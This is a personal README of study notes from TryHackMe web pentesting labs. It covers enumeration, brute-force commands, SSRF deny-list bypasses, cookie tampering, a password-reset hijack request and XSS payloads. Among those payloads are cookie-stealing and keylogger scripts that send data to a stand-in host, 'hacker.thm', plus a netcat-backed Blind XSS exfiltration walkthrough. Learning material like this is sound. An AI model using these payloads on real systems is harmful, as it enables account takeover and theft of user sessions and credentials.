# cyber-security
My journey into cybersecurity and penetration testing. Transitioning into Cybersecurity with focus on Penetration Testing and Vulnerability Assessment.

Location: Netherlands  
Background: IT Operations, QA, Support

## Skills

- Network Security
- Web Security
- Penetration Testing
- Vulnerability Assessment

## Labs Completed

- TryHackMe Labs
  dirb http:// shown the open link after + icon
  Cntent discovery
  Framework version and changelog can tell about potential vulnnerabilities
  Accessing the directories like /assets can give unpermittedd access
  DOM structuree might contain secret pages
  "Pretty print" to read js files in the source, can be done by pressing {} button

  Favicon can be degugged in terminal with command curl URL | md5sum to define the framework via https://wiki.owasp.org/index.php/OWASP_favicon_database, after that the framework page can  tell if any default admin credentials are still available to exploit the system
  Robot.txt can be checked for any content not allowedd to be seen: http://.../robot.txt
  In sitemap, the pages which should be parsed by crawlers, can be checked for secret pages too .../sitemap.xml

   Try running the below curl command against the web server, where the -v switch enables verbose mode, which will output the headers (there might be something interesting!). curl http://... -v
 OSINT  Google Hacking / Dorking https://en.wikipedia.org/wiki/Google_hacking

https://archive.org/web/ to access the old revision of the content to see if old pages are accessible

You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.
Workiing with the worlists withh the Automation Tools:
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

Three different subdomain enumeration methods: 
Brute Force
- dnsrecon -t brt -d acmeitsupport.thm
OSINT (Open-Source Intelligence):
- Go to Google and use the search term site:*.tryhackme.com -site:www.tryhackme.com, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.
- Sublist3r https://www.kali.org/tools/sublist3r/  ./sublist3r.py -d acmeitsupport.thm
- SSL/TLS
  -- Via Ctr if the webiste is overloaded, curl "https://crt.sh/?q=%25.tryhackme.com&output=json"
  -- via Kali Linux
Virtual Host
- user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.114.161.56
The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value
- user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.114.161.56 -fs {size}
This command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size

Username enumeration:
- user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.114.128.42/customers/signup -mr "username already exists"
the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.
Credentials enumeration Brute force:
created a txt file with the usernames from the previous step and put it in the same directory as SecLists
- user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.114.152.71/customers/login -fc 200
This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.
Logic flow is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.
Example PHP script:
if( url.substr(0,6) === '/admin') {
    ##Code to check user is an admin
} else {
    # View Page
}
- Hydra hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V


Example for PHP:
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.
The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
Create an emppty account
user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={enpty_account_email}'

Cookie tempering:
user@tryhackme$ curl http://10.112.181.83/cookie-test
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.112.181.83/cookie-test
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.112.181.83/cookie-test

https://crackstation.net for reverse the hash of any type
https://www.base64encode.org

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

SSRF stands for Server-Side Request Forgery cane be 2 types:
- regular SSRF where data is returned to the attacker's screen
- Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
A successful SSRF attack can result in any of the following: 
Access to unauthorised areas.
Access to customer/organisational data.
Ability to Scale to internal networks.
Reveal authentication tokens/credentials.
Some examples:
1. http://website.thm/stock?url=http://api.website.thm/api/users
2. http://website.thm/stock?url=../user
3.http://website.thm/stock?server=api.website/thm/api/user&x=id=123 The payload eneded with &x= being used to stop the remaining path from being appendded to the end of the attacler's URL and instead turns it into a parameter ?x= on the query string. In the URL you provided, the &x= parameter is used to manipulate the server's request handling. By appending &x=, it effectively tells the server to treat everything that follows as a parameter instead of part of the URL path. This is useful in SSRF (Server-Side Request Forgery) attacks, allowing the attacker to influence server-side behavior by passing parameters that may alter the response or access sensitive data. The server interprets x=id=123 as a query parameter, thereby ignoring the rest of the URL path that could lead to unintended access or information leakage.
<img width="842" height="837" alt="Screenshot 2026-02-23 at 16 44 29" src="https://github.com/user-attachments/assets/a196ae52-d926-4eb7-a46e-5aa5a9ce4973" />
How to spotvulneerability:
<img width="842" height="837" alt="Screenshot 2026-02-23 at 16 46 37" src="https://github.com/user-attachments/assets/1cf1b293-24b5-46e3-965f-9755e6aa949a" />
More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.

Deny List
A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.

Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.

Open Redirect
If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

XSS 
What is a payload?
In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.
The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).
Here are some examples of XSS intentions.
Proof Of Concept:
This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
<script>alert('XSS');</script>
It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: "><script>alert('THM');</script>

The important part of the payload is the "> which closes the value parameter and then closes the input tag.
To escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: </textarea><script>alert('THM');</script>. The important part of the above payload is </textarea>, which causes the textarea element to close so the script will run.
To escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

Session Stealing:
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

Key Logger:
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

Business Logic:
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

<script>user.changeEmail('attacker@hacker.thm');</script>

For protecte inputs: <sscriptcript>alert('THM');</sscriptcript>
To close the image tag: /images/cat.jpg" onload="alert('THM');

XSS Polyglotes:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

Now that the email address for the account has changed, the attacker may perform a reset password attack.
Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.




Potential Impact:

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

Comments on a blog
User profile information
Website Listings
Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 

Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.


Example Scenario:
A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.
The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.
The vulnerability can be used as per the scenario in the image below:
Potential Impact:

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

Parameters in the URL Query String
URL File Path
Sometimes HTTP Headers (although unlikely exploitable in practice)
Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
DOM Based XSS

What is the DOM?
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:



If you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.

Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.


Example Scenario:

The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.


Potential Impact:

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

How to test for Dom Based XSS:

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
How to test for Blind XSS:

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is XSS Hunter Express https://github.com/mandatoryprogrammer/xsshunter-express. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

4. http://website.thm/stock?url=http://hacker.domain.thm
Blind XSS:
How to create a listening service
let’s set up a listening server using Netcat. If we want to listen on port 9001, we issue the command nc -l -p 9001. The -l option indicates that we want to use Netcat in listen mode, while the -p option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001.
1. Create a ticket with body </textarea>test to escape the textarea
2. Now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:
</textarea><script>alert('THM');</script>
3. Break down the next payload:

The </textarea> tag closes the text area field.
The <script> tag opens an area for us to write JavaScript.
The fetch() command makes an HTTP request.
URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
?cookie= is the query string containing the victim’s cookies.
btoa() command base64 encodes the victim’s cookies.
document.cookie accesses the victim’s cookies for the Acme IT Support Website.
</script>closes the JavaScript code block.
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
4. Send another payload but swap out IP and Port
</textarea><script>fetch('http://PORT_NUMBER:URL_OR_IP?cookie=' + btoa(document.cookie) );</script>
5. Decode the cookia via base64 decoder

Web DOM:
one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links

Networking:
🎯 Easy Memory Trick:
All People Seem To Need Data Processing
(First letter = layer from top to bottom)
🧠 The 7 Layers (Top → Bottom)
7️⃣ Application
What the user interacts with
Examples: HTTP, FTP, SMTP
Web browsers live here
6️⃣ Presentation
Formats data
Encryption / Decryption
Compression
👉 Makes data readable.
5️⃣ Session
Starts and ends connections
Manages sessions between devices
4️⃣ Transport
End-to-end communication
Uses TCP or UDP
Handles ports
Breaks data into segments
👉 Reliable or fast delivery.
3️⃣ Network
Handles IP addresses
Routing between networks
Uses routers
2️⃣ Data Link
Uses MAC addresses
Works with switches
Frames data
1️⃣ Physical
Cables, signals, electricity
Bits (0s and 1s)
📦 The 4 Layers of the TCP/IP Model
This is the practical model used in real networks.
🎯 Memory Trick:
Application
Transport
Internet
Network
(ATIN — short and easy)
🧠 The 4 Layers (Top → Bottom)
4️⃣ Application
Combines OSI layers 7, 6, 5
HTTP, FTP, DNS, SMTP
3️⃣ Transport
TCP / UDP
Ports
Reliable delivery
2️⃣ Internet
IP addressing
Routing
Same as OSI Layer 3
1️⃣ Network Access
MAC addresses
Physical hardware
Same as OSI Layers 1 & 2 combined
🔥 Super Simple Comparison
OSI (7)	TCP/IP (4)
7 Application	Application
6 Presentation	Application
5 Session	Application
4 Transport	Transport
3 Network	Internet
2 Data Link	Network Access
1 Physical	Network Access

Use case:
1. While walking around look for the paper notes, sticky notes or other details htat can be a password
2. Use list of commonly used password from the National Security Center
3. Use the history to look for misspeled command that can be a password
4. Use whoami to verify the obtained identity


   

- HackTheBox Machines
- PortSwigger Labs

## Certifications

- ISC2 Certified in Cybersecurity (in progress)


